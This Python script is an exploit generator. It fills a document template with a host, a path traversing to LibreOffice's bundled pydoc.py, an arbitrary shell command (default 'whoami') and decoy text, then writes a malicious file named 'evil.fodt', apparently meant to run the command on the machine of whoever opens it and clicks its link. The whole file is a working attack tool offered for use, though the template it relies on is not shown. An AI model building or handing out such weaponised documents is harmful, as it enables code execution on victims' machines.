import argparse

def gen_payload(ip: str,file_path: str, command:str, text:str) -> str:
    with open("FODT-Template","r") as f:
        s = ("".join(f.readlines())).format(ip,file_path,command,text);
    return s;

def main():
    parser = argparse.ArgumentParser(description='Custom CLI')

    # Add optional arguments
    parser.add_argument('-i','--ip', default='example.com', help='IP or domain for the embedded link')
    parser.add_argument('-f','--file', default='../../../program/python-core-3.5.5/lib/pydoc.py', help='File path of pydoc (default: ../../../program/python-core-3.5.5/lib/pydoc.py')
    parser.add_argument('-c','--command', default='whoami', help='Command to run (default: whoami)')
    parser.add_argument('-t','--text', default='oops...', help='Text to show on the document (default: oops...)')
    parser.add_argument('-o','--output', default='evil.fodt', help='Name of the output file')
    
    args = parser.parse_args()

    # Access the values of the options
    ip = args.ip
    file_path = args.file
    command = args.command
    text = args.text
    fname = args.output

    # Now you can use these values in your program as needed
    
    payload = gen_payload(ip,file_path,command,text);

    print(f"[+] Generated payload and saved to {fname}");
    with open(fname,"w") as f:
        f.write(payload);
    print("[!] If you want odt format, convert it in libre-office by saving evil.fodt as an .odt file");


if __name__ == '__main__':
    main()
